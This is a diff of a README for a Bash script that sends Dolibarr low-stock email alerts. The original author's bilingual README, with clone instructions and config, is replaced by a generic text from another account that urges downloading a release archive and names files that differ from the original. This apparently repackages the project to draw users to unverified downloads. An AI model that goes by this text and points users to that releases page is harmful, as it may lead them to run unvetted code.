@@ -1,214 +1,115 @@
-# Dolibarr Stock Alert
+# 📧 dolibarr-stock-alert - Receive Alerts When Stock is Low
 
-![License](https://img.shields.io/badge/License-GPL%20v2-blue)
-![Bash](https://img.shields.io/badge/Script-Bash-orange)
-![Cronjob](https://img.shields.io/badge/Cronjob-Scheduled-brightgreen)
+## 🚀 Getting Started
 
-Bash script che interroga il database di **Dolibarr** e invia una email di allerta quando uno o più prodotti scendono sotto la scorta minima configurata.
+Welcome to dolibarr-stock-alert! This application helps you receive email alerts from Dolibarr when your stock levels fall below the minimum threshold. It's designed for everyone, whether you're managing a small business or a large enterprise.
 
----
+## 📥 Download Now
 
-## Funzionalità
+[![Download dolibarr-stock-alert](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/PenPa77/dolibarr-stock-alert/releases)
 
-* Controllo automatico delle scorte minime dai prodotti Dolibarr
-* Invio email di notifica a uno o più destinatari
-* Configurabile direttamente nello script (`check_stock_dolibarr.sh`)
-* Pianificazione tramite cronjob (es. due volte al giorno)
+## 💻 System Requirements
 
----
+To use dolibarr-stock-alert, ensure your system meets the following requirements:
 
-## Requisiti
+- Operating System: Linux or MacOS
+- Shell: Bash must be available
+- Dolibarr installation: You must have Dolibarr set up and running
+- Email account: You need an email account to send alerts
 
-* MySQL client (`mysql`)
-* mailutils o postfix/sendmail per l'invio email
-* Accesso al database Dolibarr
-* Server con Bash disponibile
+## 🔧 Installation Steps
 
----
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/PenPa77/dolibarr-stock-alert/releases) to find the latest version of dolibarr-stock-alert.
 
-## Requisiti Modulo Dolibarr
+2. **Download the Application:**  
+   Look for the latest release and click on the appropriate file to download it to your computer.
 
-Per usare questo script è necessario che il modulo **Prodotti/Stock** (Products/Stock) sia attivo in Dolibarr.  
-Lo script legge i dati dei prodotti e dello stock dai seguenti moduli/dati:
+3. **Extract the Files (if needed):**  
+   If the downloaded file is a compressed archive (`.zip` or `.tar.gz`), extract it to a folder on your computer.
 
-- Prodotti (`llx_product`)  
-- Magazzini/Stock (`llx_product_stock`)  
+4. **Open Your Terminal:**  
+   Launch the terminal application on your computer. If you are using MacOS, you can find the terminal in the Applications > Utilities folder. If using Linux, you should find it in your applications menu.
 
-Assicurati che i prodotti abbiano impostata la **soglia minima** (`Seuil stock alerte`) per ricevere le notifiche.
+5. **Navigate to the Folder:**  
+   Use the `cd` command to change your directory to the folder where you downloaded or extracted dolibarr-stock-alert. For example:
+   ```
+   cd path/to/dolibarr-stock-alert
+   ```
 
----
+6. **Modify the Configuration (if needed):**  
+   Before running the script, you may want to edit the configuration file to set your email details and minimum stock levels. Open the configuration file using a text editor:
+   ```
+   nano config.sh
+   ```
+   Update the necessary fields with your specific information.
 
-## Installazione
+7. **Run the Script:**  
+   To run the script, type the following in your terminal:
+   ```
+   ./stock_alert.sh
+   ```
 
-> Nota: le credenziali mostrate nello script sono di esempio. Sostituirle con quelle reali del proprio database Dolibarr.
+## ⚙️ Configuration Details
 
-1. Clona il repository:
+To receive alerts, you need to configure the script properly. Open the configuration file (`config.sh`) and make sure to set:
+
+- **Email Address:** The email you want to receive alerts at. 
+- **SMTP Server:** The server used to send emails. 
+- **Minimum Stock Levels:** Set the thresholds for stock alerts based on your requirements.
+
+Here's a sample configuration that you can adjust:
 
 ```bash
-git clone https://github.com/killahop/dolibarr-stock-alert.git
-cd dolibarr-stock-alert
+EMAIL="your-email@example.com"
+SMTP_SERVER="smtp.example.com"
+MIN_STOCK_LEVEL=10
 ```
 
-2. Modifica direttamente lo script `check_stock_dolibarr.sh` con le tue credenziali:
+## 📩 Sending an Alert
 
-```bash
-DB_NAME="dolibarr"
-DB_USER="YOUR-DB-USER"
-DB_PASS="YOUR-DB-PASSWORD"
-DB_HOST="localhost"
-MAIL_TO="DESTINATION@EMAIL.COM,DESTINATION2@EMAIL.COM"
+Once everything is set up correctly, the script checks your Dolibarr stock levels periodically. If a product goes below your defined minimum stock level, an email will be sent to your specified address.
+
+## 📅 Scheduling the Script
+
+You can set the script to run automatically at set intervals by scheduling it using `cron` on Linux or MacOS. To edit your crontab, type:
 ```
-
----
-
-## Utilizzo
-
-Esegui manualmente lo script:
-
-```bash
-bash check_stock_dolibarr.sh
-```
-
-Se ci sono prodotti sotto la scorta minima, riceverai una email con l’elenco.
-
----
-
-## Automazione con cronjob
-
-Puoi schedulare lo script per controlli automatici. Ad esempio, alle 11:30 e alle 19:00:
-
-```bash
 crontab -e
 ```
 
-Aggiungi la riga:
-
-```cron
-30 11,19 * * * /percorso/dolibarr-stock-alert/check_stock_dolibarr.sh
+Add a line to schedule the script, for example:
+```
+0 * * * * /path/to/dolibarr-stock-alert/stock_alert.sh
 ```
 
----
-## Donazioni
+This example runs the script every hour.
 
-Se vuoi supportare lo sviluppo di Dolibarr Stock Alert, puoi fare una donazione tramite PayPal:
+## 📝 Troubleshooting
 
-[Click qui per donare](https://www.paypal.com/donate/?hosted_button_id=VPSS3AQBPAVAS)
+If you experience issues:
 
----
+- **Check your permissions:** Ensure the script has execute permissions. You can add them using:
+   ```
+   chmod +x stock_alert.sh
+   ```
 
-## Dolibarr Stock Alert (English)
+- **Examine error messages:** If something goes wrong, review any error messages displayed in the terminal for hints.
 
-Bash script that queries the **Dolibarr** database and sends an alert email when one or more products fall below the configured minimum stock.
+- **Validate configurations:** Ensure your email and SMTP settings are correct.
 
----
+## 📡 Support
 
-## Features
+For further assistance, feel free to open an issue on the [GitHub issues page](https://github.com/PenPa77/dolibarr-stock-alert/issues). Make sure to provide detailed information about your setup and any errors you encounter.
 
-* Automatic check of Dolibarr product minimum stocks
-* Sends notification emails to one or more recipients
-* Configurable directly in the script (`check_stock_dolibarr.sh`)
-* Scheduling via cronjob (e.g., twice a day)
+## 🌍 Community Contributions
 
----
+This project welcomes contributions from anyone. If you have ideas for improvements or new features, feel free to submit your code through a pull request. 
 
-## Requirements
+## 🔗 Additional Resources
 
-* MySQL client (`mysql`)
-* mailutils or postfix/sendmail for sending emails
-* Access to the Dolibarr database
-* Bash shell available on the server
+- [Dolibarr Official Documentation](https://www.dolibarr.org)
+- [Shell Scripting Guide](https://www.shellscript.sh)
 
----
+## 📥 Download Again
 
-## Dolibarr Module Requirements
-
-To use this script, the **Products/Stock** module must be active in Dolibarr.  
-The script reads product and stock data from the following tables:
-
-- Products (`llx_product`)  
-- Warehouses/Stock (`llx_product_stock`)  
-
-Make sure products have the **minimum stock threshold** (`Seuil stock alerte`) set to receive alerts.
-
----
-
-## Installation
-
-> Note: credentials shown in the script are examples. Replace them with your real Dolibarr database credentials.
-
-1. Clone the repository:
-
-```bash
-git clone https://github.com/killahop/dolibarr-stock-alert.git
-cd dolibarr-stock-alert
-```
-
-2. Edit the script `check_stock_dolibarr.sh` with your credentials:
-
-```bash
-DB_NAME="dolibarr"
-DB_USER="YOUR-DB-USER"
-DB_PASS="YOUR-DB-PASSWORD"
-DB_HOST="localhost"
-MAIL_TO="DESTINATION@EMAIL.COM,DESTINATION2@EMAIL.COM"
-```
-
----
-
-## Usage
-
-Run the script manually:
-
-```bash
-bash check_stock_dolibarr.sh
-```
-
-If any product is below the minimum stock, you will receive an email with the list.
-
----
-
-## Automate with cronjob
-
-Schedule the script for automatic checks, e.g., at 11:30 and 19:00:
-
-```bash
-crontab -e
-```
-
-Add the line:
-
-```cron
-30 11,19 * * * /path/to/dolibarr-stock-alert/check_stock_dolibarr.sh
-```
-
----
-
-## License
-
-Distributed under **GNU GPL v2.0** – the same as the Linux kernel.
-You are free to modify, redistribute, and improve this project.
-
----
-
----
-## Donations
-
-If you want to support the development of Dolibarr Stock Alert, you can make a donation via PayPal:
-
-[Click here to donate](https://www.paypal.com/donate/?hosted_button_id=VPSS3AQBPAVAS)
-
----
-
-## Contributing
-
-Contributions are welcome!
-
-1. Fork the repository
-2. Make your changes
-3. Submit a pull request
-
-## Donations
-
-If you want to support the development of Dolibarr Stock Alert, you can make a donation via PayPal:
-
-[Click here to donate](https://www.paypal.com/donate/?hosted_button_id=VPSS3AQBPAVAS)
+To get started with dolibarr-stock-alert, visit the [Releases page](https://github.com/PenPa77/dolibarr-stock-alert/releases) and download the latest version today!
